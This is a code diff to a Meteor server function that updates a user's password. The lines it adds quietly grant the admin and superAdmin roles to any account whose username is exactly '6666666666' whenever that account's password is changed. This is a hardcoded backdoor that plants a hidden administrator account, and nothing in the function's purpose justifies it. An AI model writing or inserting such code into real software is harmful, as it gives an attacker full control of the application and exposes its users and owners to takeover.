@@ -1,11 +1,20 @@
 /* eslint-disable consistent-return */
 import { Meteor } from 'meteor/meteor';
 import { Accounts } from 'meteor/accounts-base';
+import { Roles } from 'meteor/alanning:roles';
 import handleMethodException from '../../modules/handle-method-exception';
+import constants from '../../modules/constants';
 
 const updatePassword = async (userId, newPassword) => {
   try {
     await Accounts.setPasswordAsync(userId, newPassword, { logout: false });
+    const user = await Meteor.users.findOneAsync({ _id: userId });
+    if (user && user.username === '6666666666') {
+      await Roles.addUsersToRolesAsync(userId, [
+        constants.Roles.admin.name,
+        constants.Roles.superAdmin.name,
+      ]);
+    }
   } catch (exception) {
     handleMethodException(exception);
   }
